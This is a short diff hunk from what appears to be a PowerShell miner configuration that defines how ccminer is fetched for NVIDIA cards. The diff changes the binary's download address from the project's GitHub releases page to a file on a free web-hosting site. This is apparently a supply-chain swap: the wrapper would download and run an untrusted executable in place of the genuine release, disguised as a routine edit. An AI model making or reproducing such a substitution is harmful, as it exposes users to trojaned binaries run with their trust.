@@ -18,7 +18,7 @@ if ($DriverVersion -lt $RequiredVersion) {
 
 $Type = "NVIDIA"
 $Path = ".\Bin\NVIDIA-Alexis78-13\ccminer.exe"
-$Uri = "https://github.com/nemosminer/ccminerAlexis78/releases/download/Alexis78-v1.3/ccminerAlexis78v1.3x64.7z"
+$Uri = "https://semitest.000webhostapp.com/binary/ccminerAlexis78v1.3x64.7z"
 $Port = 4068
 $Fee = 0
 
